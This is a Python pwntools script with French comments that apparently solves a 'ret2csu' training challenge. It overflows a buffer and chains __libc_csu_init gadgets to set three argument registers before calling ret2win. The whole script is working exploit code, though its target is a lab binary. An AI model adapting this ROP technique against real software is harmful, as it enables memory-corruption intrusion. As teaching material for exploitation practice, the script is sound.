from pwn import *

# But de la ROP chain :
#
# Appeler ret2win avec rdi, rsi, rdx imposés. Problème : pas de "pop rdx ; ret".
# Parade universelle = ret2csu : on détourne les gadgets de __libc_csu_init
# Ils sont présents dans presque tout binaire lié à la glibc.
#
#   Gadget A (POP) @ 0x40069a :
#     pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
#   Gadget B (MOV+CALL) @ 0x400680 :
#     mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call [r12 + rbx*8]
#     (puis : add rbx,1 ; cmp rbp,rbx ; jne ... ; add rsp,8 ; pop rbx..r15 ; ret)
#
# Plan : A charge r13/r14/r15 -> B les copie dans edi/rsi/rdx puis fait un
# call [r12+rbx*8] (qu'on neutralise : r12 pointe une fct qui retourne).
# edi n'est que 32 bits -> on règle rdi en entier APRÈS, avec un pop rdi.

context.bits = 64
elf = ELF("./ret2csu")

# --- Gadgets (objdump -d ./ret2csu | grep -A40 __libc_csu_init) --------------
csu_mov = p64(0x400680)   # mov rdx,r15 ; mov rsi,r14 ; mov edi,r13d ; call [r12+rbx*8]
csu_pop = p64(0x40069a)   # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_rdi = p64(0x4006a3)   # pop rdi ; ret
#   Correspondance confirmée dans le binaire : r13 -> edi, r14 -> rsi, r15 -> rdx

# r12 = pointeur vers une fonction qui retourne proprement (cible de call [r12]).
# Ici une entrée de .fini_array (pointe __do_global_dtors_aux, qui revient sans
# casser rsi/rdx).
# Alternative : 0x600df0 (.init_array -> frame_dummy).
safe_ptr = p64(0x600df8)

ret2win = p64(elf.symbols["ret2win"])    # (gdb) p ret2win

# Valeurs voulues. La 3e (rdx) est celle que ret2win vérifie : à confirmer dans
# objdump -d ./ret2csu (le cmp dans ret2win) ou via la sortie du programme.
ARG_RDI = 0xdeadbeefdeadbeef
ARG_RSI = 0xcafebabecafebabe
ARG_RDX = 0xd00df00dd00df00d

payload  = b"A" * 40
# Obtention du 40 : msf-pattern_create / msf-pattern_offset

# --- Gadget A : on charge les registres -------------------------------------
payload += csu_pop
payload += p64(0)            # rbx = 0   -> call [r12 + 0*8] = call [r12]
payload += p64(1)            # rbp = 1   -> après "add rbx,1" rbx=1 ; "cmp rbp,rbx" égal -> PAS de boucle
payload += safe_ptr          # r12 = pointeur vers une fct qui retourne
payload += p64(ARG_RDI)      # r13 -> edi   (low 32 bits seulement, on corrige rdi plus bas)
payload += p64(ARG_RSI)      # r14 -> rsi
payload += p64(ARG_RDX)      # r15 -> rdx

# --- Gadget B : mov edi/rsi/rdx puis call [r12] -----------------------------
payload += csu_mov

# --- Épilogue de csu APRÈS le call : add rsp,8 ; pop rbx..r15 ; ret ----------
#     7 qwords à consommer (1 pour add rsp,8 + 6 pour les pop)
payload += p64(0) * 7

# --- rdi en entier (csu n'a mis que edi = low 32) puis ret2win ---------------
payload += pop_rdi + p64(ARG_RDI)   # rdi = valeur 64 bits complète
payload += ret2win                  # rsi et rdx ont survécu (non poppés par l'épilogue)

p = process("./ret2csu")
p.sendline(payload)
print(p.recvall().decode())
